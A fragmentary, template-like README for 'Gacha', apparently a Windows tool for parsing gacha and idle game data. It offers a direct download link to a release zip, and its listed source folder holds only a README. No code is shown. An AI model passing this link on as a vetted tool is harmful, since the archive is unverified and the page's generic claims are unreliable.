...
<img src="preview.svg" alt="Gacha" width="100%"/>

# Gacha

**Gacha / idle game data parser — Windows desktop utility with batch export workflow**
...
**Gacha** is a Windows-focused desktop utility for **gacha / idle game data parser**. Point it at a local game folder or archive, pick an export preset, and run a batch job — no manual hex editing required.
...
| Feature | Description |
|---|---|
| CLI mode | Scriptable commands for automation pipelines |
...
[![Download](button.svg)](https://github.com/CliffToucan65/gacha-idle-game-data-parser-tool/releases/download/v4.8.49/gacha-idle-game-data-parser-tool-v4.8.49.zip)
...
```
gacha-idle-game-data-parser-tool/
├── docs/
│   └── QUICKSTART.md
├── src/
│   └── README.md
...
<div align="center">
<sub>Windows · Game asset tooling · Open Source · gacha-idle-game-data-parser</sub>
</div>
